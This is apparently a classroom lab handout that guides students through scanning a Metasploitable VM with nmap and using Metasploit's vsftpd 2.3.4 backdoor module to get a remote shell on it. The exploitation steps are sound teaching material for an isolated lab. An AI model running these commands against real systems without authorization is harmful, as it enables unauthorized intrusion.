# Lab 5 - Vulnerability Exploitation

## **Lab Preparation**

Ensure that both the Kali and the metasploitable machines are powered on and on the
same network. Verify connectivity between them by using the ping command.

 1. Run nmap against the metasploitable machine using the following command.

	- ```sudo nmap -sV <metasploitable IP> -vvv``` 

	- Make note of open ports and services.

	- Make note of what port VSFTPD service is running.

 2. Start the Kali PostgreSQL service (which Metasploit uses as its backend) by
running the following command.

	- ```sudo systemctl start postgresql```

 3. Initialize the Metasploit PostgreSQL database by running the following command.

	- ```sudo msfdb init```

 4. Launch msfconsole

	- ```msfconsole```

 5. Check the database connectivity using the following command.

	- ```db_status``` (it should say connected).

 6. Explore the search command by typing "help search".

 7. Search for an VSFTPD exploit.

	- ```search type:exploit name:vsftp```

 8. How many exploits were found?

 9. Select the found exploit by typing the following command.

	- ```use exploit/unix/ftp/vsftpd_234_backdoor```

 10. Review the options of the exploit by typing the following command.

	 - ```show options```

 11. Set the remote host and ports by using the following commands.

	 - ```set RHOSTS <Metasploitable IP Address>

	 - ```set RPORT <VSFTPD port number>

 12. Verify what payloads are available by using the "show payloads" command.

 13. How many payloads are available?

 14. Run the exploit by using the following command.

	 - ```exploit```

 15. Once the shell is opened type ```hostname```, followed by ```ifconfig```. Include screenshot of output.
